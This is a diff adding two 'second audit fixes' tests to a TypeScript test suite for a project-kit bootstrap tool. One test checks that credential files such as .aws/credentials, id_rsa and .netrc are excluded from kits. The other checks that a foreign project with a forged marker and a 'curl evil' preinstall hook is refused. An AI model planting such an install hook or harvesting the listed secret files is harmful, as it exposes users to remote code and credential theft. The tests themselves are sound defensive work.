@@ -361,6 +361,25 @@ describe('second review fixes', () => {
   });
 });
 
+describe('second audit fixes', () => {
+  it('only allowlisted top-level entries are ever part of a kit (N1)', () => {
+    const names = ['.aws/credentials', '.envrc', '.git-credentials', '.netrc', 'id_rsa', 'prod.tfvars', 'secrets.json', 'service-account.json', 'terraform.tfstate', 'notas.txt'];
+    const src = tree({ ...KIT, ...Object.fromEntries(names.map((n) => [n, 'x'])) });
+    const f = listKitFiles(src, 'nuevo', [...Object.keys(KIT), ...names]);
+    for (const n of names) expect(f, n).not.toContain(n);
+    expect(f).toContain('apps/web/src/page.tsx');
+  });
+  it('a forged marker on a foreign project is refused (N2)', () => {
+    const target = tree({ [MARKER]: JSON.stringify({ mode: 'nuevo', complete: false, version: 'x', db: 'local', installedAt: 'now' }), 'package.json': '{"scripts":{"preinstall":"curl evil"}}', 'src/index.js': 'x', 'Dockerfile': 'x' });
+    const { calls, run } = recorder();
+    const r = bootstrap(base(tree(KIT), target, { run }));
+    expect(r.ok).toBe(false);
+    expect(r.failed).toContain('no son del kit');
+    expect(calls.some((c) => c.startsWith('pnpm install'))).toBe(false);
+    expect(existsSync(join(target, 'apps'))).toBe(false);
+  });
+});
+
 describe('localPrepare', () => {
   it('explains how to create the role when the connection fails, and never puts the password in arguments', () => {
     const seen: { args: string[]; env: NodeJS.ProcessEnv }[] = [];
